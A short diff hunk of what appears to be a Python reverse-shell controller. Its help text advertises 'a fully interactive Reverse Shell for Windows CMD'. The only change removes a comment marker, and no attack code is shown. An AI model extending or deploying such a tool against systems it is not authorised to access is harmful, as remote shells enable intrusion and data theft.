@@ -5,7 +5,7 @@ import os
 import threading
 import urllib.parse
 from http.server import BaseHTTPRequestHandler, HTTPServer
-##
+
 SEPARATOR = "<sep>"  # For separating filename and filesize
 HelpList = ["This is a List of all available commands", "--------------------------------------------------",
             "[*] This a fully interactive Reverse Shell for Windows CMD so you can use any CMD commands",
